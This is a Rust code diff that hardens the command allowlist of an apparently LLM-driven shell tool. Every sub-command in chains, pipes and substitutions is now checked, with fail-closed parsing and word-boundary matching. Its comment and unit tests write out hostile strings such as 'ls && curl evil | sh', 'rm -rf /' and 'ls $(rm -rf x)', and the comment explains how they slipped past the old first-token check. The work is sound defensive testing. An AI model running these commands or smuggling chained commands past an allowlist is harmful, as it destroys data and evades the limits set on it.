@@ -127,6 +127,16 @@ impl Default for AllowedGlobs {
 }
 
 impl AllowedGlobs {
+    /// Collapse the common LLM mistake `["all"]` into the wildcard `All("all")`.
+    /// Without this, a literal glob named "all" would be the only allowed path.
+    pub fn normalize(&mut self) {
+        if let AllowedGlobs::List(items) = self {
+            if items.len() == 1 && items[0] == "all" {
+                *self = AllowedGlobs::All("all".to_string());
+            }
+        }
+    }
+
     #[allow(dead_code)]
     pub fn is_allowed(&self, path: &str) -> bool {
         match self {
@@ -154,17 +164,47 @@ impl Default for AllowedCommands {
 }
 
 impl AllowedCommands {
-    #[allow(dead_code)]
+    /// Collapse the common LLM mistake `["all"]` into the wildcard `All("all")`.
+    pub fn normalize(&mut self) {
+        if let AllowedCommands::List(items) = self {
+            if items.len() == 1 && items[0] == "all" {
+                *self = AllowedCommands::All("all".to_string());
+            }
+        }
+    }
+
     pub fn is_allowed(&self, command_line: &str) -> bool {
         match self {
             AllowedCommands::All(s) if s == "all" => true,
-            AllowedCommands::List(commands) => {
-                let cmd_prog = command_line.split_whitespace().next().unwrap_or("");
-                commands.iter().any(|c| cmd_prog == c)
-            }
             AllowedCommands::All(_) => false,
+            AllowedCommands::List(commands) => {
+                // Enforce the allowlist against EVERY command the line would run
+                // (pipelines, &&/||/;, command & process substitution, subshells),
+                // not just the first whitespace token — which `ls && curl|sh` and
+                // `ls $(rm -rf x)` trivially bypassed. A parse failure is fail
+                // closed: a restricted mode must not run what it can't vet.
+                match crate::utils::bash_parser::extract_command_texts(command_line) {
+                    Ok(cmds) if !cmds.is_empty() => cmds
+                        .iter()
+                        .all(|cmd| commands.iter().any(|allowed| command_has_prefix(cmd, allowed))),
+                    _ => false,
+                }
+            }
         }
     }
+}
+
+/// Whether `cmd` is the allowlist entry `allowed` or a sub-invocation of it,
+/// enforcing a word boundary so `ls` does not also permit `lsof`, and
+/// `cargo test` does not permit `cargo testimony`.
+fn command_has_prefix(cmd: &str, allowed: &str) -> bool {
+    let cmd = cmd.trim();
+    let allowed = allowed.trim();
+    if allowed.is_empty() {
+        return false;
+    }
+    cmd == allowed
+        || cmd.strip_prefix(allowed).is_some_and(|rest| rest.starts_with(char::is_whitespace))
 }
 
 /// Parameters for initializing the shell environment
@@ -810,4 +850,49 @@ pub struct ReadImage {
     ///
     /// This can be an absolute path or a path relative to the current working directory.
     pub file_path: String,
+}
+
+#[cfg(test)]
+mod allowlist_tests {
+    use super::AllowedCommands;
+
+    fn list(items: &[&str]) -> AllowedCommands {
+        AllowedCommands::List(items.iter().map(|s| (*s).to_string()).collect())
+    }
+
+    #[test]
+    fn all_permits_everything() {
+        assert!(AllowedCommands::All("all".to_string()).is_allowed("rm -rf /"));
+    }
+
+    #[test]
+    fn list_allows_exact_and_args() {
+        let a = list(&["ls", "cargo test"]);
+        assert!(a.is_allowed("ls"));
+        assert!(a.is_allowed("ls -la"));
+        assert!(a.is_allowed("cargo test --release"));
+    }
+
+    #[test]
+    fn list_blocks_word_boundary_lookalikes() {
+        let a = list(&["ls", "cargo test"]);
+        assert!(!a.is_allowed("lsof"));
+        assert!(!a.is_allowed("cargo testimony"));
+    }
+
+    #[test]
+    fn list_blocks_chained_and_substituted_commands() {
+        let a = list(&["ls"]);
+        // The old first-token check let all of these through.
+        assert!(!a.is_allowed("ls && curl evil | sh"));
+        assert!(!a.is_allowed("ls; rm -rf /"));
+        assert!(!a.is_allowed("ls $(rm -rf x)"));
+        assert!(!a.is_allowed("ls | rm"));
+    }
+
+    #[test]
+    fn list_allows_chain_when_all_parts_permitted() {
+        let a = list(&["cargo build", "cargo test"]);
+        assert!(a.is_allowed("cargo build && cargo test"));
+    }
 }
